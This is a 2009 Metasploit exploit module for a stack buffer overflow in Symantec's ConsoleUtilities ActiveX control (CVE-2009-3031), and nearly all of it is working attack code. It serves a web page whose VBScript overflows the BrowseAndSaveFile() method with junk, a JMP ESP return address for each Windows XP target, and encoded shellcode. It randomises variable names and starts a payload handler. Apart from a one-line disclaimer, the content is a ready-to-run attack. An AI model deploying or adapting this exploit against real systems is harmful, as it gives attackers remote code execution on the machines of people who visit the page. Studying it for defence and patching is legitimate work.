Symantec ConsoleUtilities ActiveX Buffer Overflow
=================================================



# Title: Symantec ConsoleUtilities ActiveX Buffer Overflow
# CVE-ID: ()
# OSVDB-ID: ()
# Author: Nikolas Sotiriu
# Published: 2009-11-02
# Verified: yes


view source
print?
##
# Use it only for education or ethical pentesting! The author accepts no liability for damage caused by this tool.
##
 
require &#039;msf/core&#039;
 
 
class Metasploit3 < Msf::Exploit::Remote
 
        include Msf::Exploit::Remote::HttpServer::HTML
 
        def initialize(info = {})
                super(update_info(info,
                        &#039;Name&#039;           => &#039;Symantec ConsoleUtilities ActiveX Control Buffer Overflow&#039;,
                        &#039;Description&#039;    => %q{
                                        This module exploits a stack overflow in Symantecs ConsoleUtilities.
                                        By sending an overly long string to the "BrowseAndSaveFile()" method located
                                        in the AeXNSConsoleUtilities.dll (6.0.0.1846) Control, an attacker may be able to
                                        execute arbitrary code.
                        },
                        &#039;License&#039;        => MSF_LICENSE,
                        &#039;Author&#039;         => [ &#039;Nikolas Sotiriu (lofi)&#039; ],
                        &#039;Version&#039;        => &#039;1.0&#039;,
                        &#039;References&#039;     =>
                                [
                                        [ &#039;CVE&#039;, &#039;2009-3031&#039;],
                                        [ &#039;URL&#039;, &#039;http://sotiriu.de/adv/NSOADV-2009-001.txt&#039; ],
                                        [ &#039;URL&#039;, &#039;http://www.symantec.com/business/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2009&suid=20091102_00&#039; ],
                                ],
                        &#039;DefaultOptions&#039; =>
                                {
                                        &#039;EXITFUNC&#039; => &#039;process&#039;,
                                },
                        &#039;Payload&#039;        =>
                                {
                                        &#039;Space&#039;         => 1000,
                                        &#039;BadChars&#039;      => "\x00",
                                        &#039;StackAdjustment&#039; => -3500,
                                },
                        &#039;Platform&#039;       => &#039;win&#039;,
                        &#039;Targets&#039;        =>
                                [
                    [ &#039;Windows XP SP2 Universal&#039;,       { &#039;Ret&#039; => 0x77d92acc } ], # USER32.dll JMP ESP
                    [ &#039;Windows XP SP2 Pro German&#039;,      { &#039;Ret&#039; => 0x77D5AF0A } ], # SHELL32.dll JMP ESP
                    [ &#039;Windows XP SP3 Pro German&#039;,      { &#039;Ret&#039; => 0x7E6830D7 } ], # SHELL32.dll JMP ESP
                                ],
                        &#039;DisclosureDate&#039; => &#039;Nov 02 2009&#039;,
                        &#039;DefaultTarget&#039;  => 0))
        end
 
        def autofilter
                        false
        end
 
        def check_dependencies
                        use_zlib
        end
 
        def on_request_uri(cli, request)
                # Re-generate the payload
                return if ((p = regenerate_payload(cli)) == nil)
 
                # Randomize variables
                vname   = rand_text_alpha(rand(20) + 1)
                junk    = rand_text_alpha(rand(20) + 1)
                eip     = rand_text_alpha(rand(20) + 1)
                morejunk = rand_text_alpha(rand(20) + 1)
                sc      = rand_text_alpha(rand(20) + 1)
                buf = rand_text_alpha(rand(20) + 1)
 
 
                # Set RET and shellcode
                ret = Rex::Text.to_unescape([target.ret].pack(&#039;V&#039;))
                shellcode = Rex::Text.to_unescape(p.encoded)
 
                # Build the Site
                content = %Q|
                        <html>
                        <object classid=&#039;clsid:B44D252D-98FC-4D5C-948C-BE868392A004&#039; id=&#039;#{vname}&#039;></object>
                        <script language=&#039;vbscript&#039;>
                        arg1 = ""
                        arg3 = ""
                        arg4 = ""
                        arg5 = ""
 
                        #{junk}=String(310, "A")
                        #{eip}=unescape("#{ret}")
                        #{morejunk}=String(18, unescape("%u0041"))
                        #{sc}=unescape("#{shellcode}")
 
                        #{buf}=#{junk}+#{eip}+#{morejunk}+#{sc}
                        #{vname}.BrowseAndSaveFile arg1,#{buf},arg3,arg4,arg5
                        </script>
                        </html>
                  |
 
                print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")
 
                # Transmit the response to the client
                send_response_html(cli, content)
 
                # Handle the payload
                handler(cli)
        end
 
end



